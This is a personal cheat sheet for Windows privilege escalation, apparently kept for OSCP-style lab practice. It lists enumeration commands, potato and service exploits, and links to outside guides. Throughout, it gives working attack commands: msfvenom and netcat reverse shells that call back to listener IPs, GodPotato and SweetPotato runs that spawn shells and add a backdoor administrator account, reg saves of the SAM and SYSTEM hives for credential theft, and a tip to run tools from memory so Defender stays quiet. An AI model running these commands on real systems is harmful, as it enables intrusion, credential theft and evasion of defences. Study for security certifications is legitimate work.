---
description: >-
  at the end of the day, you have to picture the way. these tools can only guide
  you so much
---

# Windows PrivEsc

HKCU - Current User\
HKLM - Local Machine

{% embed url="https://sushant747.gitbooks.io/total-oscp-guide/content/privilege_escalation_windows.html" %}
Whole picture + Weak Services
{% endembed %}

{% embed url="https://benheater.com/thm-windows-privesc/" %}
No nonsense - straight to business
{% endembed %}

{% embed url="https://www.hackingarticles.in/windows-privilege-escalation-weak-registry-permission/" %}
Weak Registry
{% endembed %}

Host file -`C:\Windows\System32\drivers\etc\hosts`

### Post Exploit

{% embed url="https://github.com/crazywifi/Enable-RDP-One-Liner-CMD" %}

## Commands

### Fundamentals

```
powershell -ep bypass
. .\Downloads\PowerView.ps1

Powershell history at: (for each user)
cd $env:APPDATA\Microsoft\Windows\PowerShell\PSReadline

systeminfo - (look for latest hotfixes patched)
wmic qfe - check patch history (wmi - windows management instrumentation command line quick fix engineering)
wmic logicaldisk get caption,description,providername

Run Command from the other shell
[CMD] cmd /c [command]
[PS] powershell -Command '[command]'

Copy
[CMD] copy [source] [dest]
[PS] Copy-Item [source] [dest] 

Move
[CMD] move [source] [dest]
[PS] Move-Item [source] [dest]

Hidden Files
[CMD] dir /A:H 
[PS] ls -force

findstr /B /C "string" - grep basically
where /R c:\windows bash.exe

dir /R [Watch out for ADS (Alternate data streams) - good way to hide data]
more < hm.txt:root.txt
```

### Reverse Shells

The only way to get arrows in the shell

`rlwrap nc -lnvp`  &#x20;

Adding powershell and cmd to PATH, some commands like whoami may not work without it

`set PATH=%PATH%C:\Windows\System32;C:\Windows\System32\WindowsPowerShell\v1.0;`

```
1. Powershell base64 encoded reverse shell works most of the time
2. nc64.exe best run via cmd or powershell first (eg. cmd.exe /c nc64.exe ...)
For service overwriting
3. msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.45.233 LPORT=1338 -f exe -o rev.exe
4. if WebDAV enabled -> cadaver $ip [provide creds] and ftp style put revshell
```

### User & Network Enumeration

```
whoami /priv /groups
net user (lists users on system)
net user $username - lists all relavant info of that user
net localgroup $groupname

ipconfig
arp -a
netstat -ano | findstr LISTENING
```

### AV Enumeration \[AMSI, AppLocker, Defender]

```
sc query windefend
sc query <query> see what services are running
netsh advfirewall firewall dump
netsh firewall show state/config
```

{% embed url="https://juggernaut-sec.com/applocker-bypass/" %}

## Automated Enumeration

{% hint style="info" %}
Run these from a SMB network share or from memory and not transfer to disk so Defender is not triggered
{% endhint %}

#### GO TO

* winPEAS.exe
* PowerUp.ps1
* SharpUp.exe
* Rubeus.exe
* Certify.exe
* Watson.exe

#### TO BE SOON

* Seatbelt.exe
* jaws-enum.ps1
* windows-exploit-suggester.py

{% embed url="https://github.com/gladiatx0r/Powerless" %}
Legacy Windows machines without Powershell
{% endembed %}

## Passwords and Port Forwarding

```
plink.exe -l root -pw mysecretpassword 192.168.0.101 -R 8080:127.0.0.1:8080
```

Password exploits

*   Saved creds

    ```
    cmdkey /list
    runas /savecred /user:username C:\PrivEsc\reverse.exe
    runas /user:Administrator "nc.exe -e 192.168.45.233 8080 cmd"
    ```
* Registry - The registry can be searched for keys and values that contain the word "password":
*   SAM (Security Account Manager)\
    SAM and SYSTEM can be found at `Windows/System32/config`

    ```
    reg save hklm\sam c:\Temp\sam
    reg save hklm\system c:\Temp\system
    ```
* Pass the hash - if `psexec` don't work, `smbexec.py` (half shell) or `wmiexec`

```
findstr "/si password *.txt (look for string "password" in any txt file) 
```

{% code title="Keepass Database" %}
```
kpcli -kdb CEH.kdbx ls --group CEH --entries 
show -f [entry_number]
```
{% endcode %}

## Service Exploits

* Insecure Service Permissions
* Unquoted Service Path&#x20;
* Weak Registry Permissions (If writable by the "NT AUTHORITY\INTERACTIVE" group (essentially all logged-on users)

```
. .\PowerUp.ps1; Invoke-AllChecks
icacls - ACL to files/directories [Confirm our write perms on that directory]
```

{% embed url="https://kashish.gitbook.io/7/master/windows-privesc/unquoted-service-path" %}

{% embed url="https://juggernaut-sec.com/weak-service-file-permissions/#PowerUp" %}

```
shutdown -r -t 1 [time interval and reboot flags]
```

#### Scheduled Tasks aka Cronjobs

```
[CMD] schtasks
[PS] Get-ScheduledTask
```

**PSPY Equivalent - just won't know which user is running it**

{% code title="Check recently created processes " %}
```
wmic process get Name,ProcessId,CreationDate
```
{% endcode %}

## DLL Injection

{% embed url="https://github.com/fatalxs/oscp-cheatsheet/blob/main/13%20Common%20Payloads.md" %}
payload for service c file and DLL file
{% endembed %}

{% embed url="https://sirensecurity.io/blog/dllref/" %}
Locations of standard DLL files used in Windows
{% endembed %}

{% embed url="https://juggernaut-sec.com/dll-hijacking/" %}

{% hint style="info" %}
Access \[PG AD]
{% endhint %}

## Token Impersonation

Like cookies for your computer

* Delegate - created for logging into machine or RDP
* Impersonate - "non-interactive" such as attaching network drive or domain login script&#x20;

```
whoami /priv 
```

**getsystem** - Magic way to become Admin, DO NOT SPAM

{% embed url="https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/Get-System.ps1" %}

3 methods

* Named Pipe impersonation (In memory/admin)
* Named Pipe impersonation (Dropper/admin) - most risky, will be flagged by AV cus inserting dll into disk
* Token Impersonation (In memory/admin) - Needs SeDebugPriveleges

#### Potatoes

Check .NET version for GodPotato, does not miss at all just don't go for a revshell with it no point in getting a SYSTEM shell without 'whoami' for proof

```powershell
reg query "HKLM\SOFTWARE\Microsoft\Net Framework Setup\NDP" /s
```

* GodPotato &#x20;

```
.\GP.exe -cmd "net user /add jtrip jtrip"
.\GP.exe -cmd "net localgroup administrators jtrip /add"
.\RunasCs.exe "jtrip" 'jtrip' powershell.exe -r 192.168.45.187:9001
OR
impacket-psexec jtrip:jtrip@192.168.202.249 cmd.exe
```

* PrintSpoofer - .`\PrintSpoofer.exe -i -c cmd`
* SweetPotato - `.\SweetPotato.exe -e EfsRpc -p C:\programdata\nc.exe -a "192.168.45.205 1234 -e cmd"`

For PrintSpoofer, confirm Print Spooler service

```
Get-Service Spooler
```

If you really need it tho

`.\GP.exe -cmd "cmd /c C:\programdata\nc64.exe -t -e C:\Windows\System32\cmd.exe 192.168.45.205 8001"`

{% embed url="https://jlajara.gitlab.io/Potatoes_Windows_Privesc" %}
Explain how each potato works
{% endembed %}

For x86, JuicyPotato is the way?

{% embed url="https://medium.com/@Dpsypher/proving-grounds-practice-authby-96e74b36375a" %}

> ### TL/DR <a href="#tldr" id="tldr"></a>
>
> * Use Sweet Potato to rule them all - [Sweet Potato](https://jlajara.gitlab.io/Potatoes_Windows_Privesc#sweetPotato)
>
> If you do not want to use Sweet Potato:
>
> * If the machine is >= Windows 10 1809 & Windows Server 2019 - Try [Rogue Potato](https://jlajara.gitlab.io/Potatoes_Windows_Privesc#roguePotato) \[SIKE yk wassup]
> * If the machine is < Windows 10 1809 < Windows Server 2019 - Try [Juicy Potato](https://jlajara.gitlab.io/Potatoes_Windows_Privesc#juicyPotato)

## Always Install Elevated

* Check if the `AlwaysInstallElevated` setting has been enabled

```powershell
reg query HKLM\Software\Policies\Microsoft\Windows\Installer
reg query HKCU\Software\Policies\Microsoft\Windows\Installer
```

* If either of those queries return `1`, can get an elevated shell
* Use `msfvenom` to create an `.msi` payload and run it on the target

```powershell
msiexec /quiet /qn /i <path to msi>
```

## Startup Applications <a href="#startup-applications" id="startup-applications"></a>

Find Which User Runs a Process in Command Prompt

```
tasklist /V
```

```powershell
icacls.exe "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup"
```

PowerShell

* If `BUILTIN\Users` has `(F)`, we can add a payload there
* Use `msfvenom` to generate a reverse shell `exe` payload
* Put the payload in the folder
* Start a listener
* Wait for an admin to login

## Macros

{% embed url="https://0xdf.gitlab.io/2020/02/01/htb-re.html#prepare-document" %}

## Recycle Bin

View items in the bin innit

```
$shell = New-Object -ComObject Shell.Application
$recycleBin = $shell.Namespace(0xA)
$recycleBin.items() | Select-Object Name, Path

Restore deleted file

$recycleBin = (New-Object -ComObject Shell.Application).NameSpace(0xA)
$items = $recycleBin.Items()
$item = $items | Where-Object {$_.Name -eq "wapt-backup-sunday.7z"}
$documentsPath = [Environment]::GetFolderPath("Desktop")
$documents = (New-Object -ComObject Shell.Application).NameSpace($documentsPath)
$documents.MoveHere($item)
```

## Exe Analysis

dnSpy the GOAT

<div align="left"><figure><img src="../.gitbook/assets/image (1) (1) (1) (1) (1) (1).png" alt="" width="563"><figcaption></figcaption></figure></div>

## Kernel Exploits

windows-exploit-suggester.py does bitsss (update db before using tho, run locally: feed it systeminfo data and it will run it against its db)

`systeminfo` output required, the git repo tells you how it's done

{% embed url="https://juggernaut-sec.com/kernel-exploits-part-2/" %}

MS10-059 and others very popular: focus on privelege escalation vulns mentioned&#x20;

{% embed url="https://github.com/SecWiki/windows-kernel-exploits" %}

#### WSL

not sure if i need it at this point in time so do come back and check up
